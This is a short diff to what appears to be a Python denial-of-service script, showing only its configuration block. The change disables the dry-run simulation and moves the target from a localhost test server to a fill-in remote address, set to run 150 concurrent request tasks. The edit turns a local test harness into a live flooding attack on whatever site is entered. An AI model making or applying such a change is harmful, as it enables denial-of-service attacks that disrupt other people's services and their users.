@@ -1113,9 +1113,9 @@ import asyncio
 import random
 from datetime import datetime
 
-# Global variables
-DRY_RUN = True  # Set to True to simulate requests
-TARGET_URL = "http://localhost:8081"  # launch the 'test_ddos_script_locally.py' first if you want to test this locally
+# Global variables (modify these)
+DRY_RUN = False  # Set to True to simulate requests
+TARGET_URL = "https://your-target-here.com"
 DURATION = 4  # Total duration of the attack in seconds
 CONCURRENCY = 150  # Number of concurrent tasks
 REQUEST_TIMEOUT = 3  # Timeout for each request in seconds
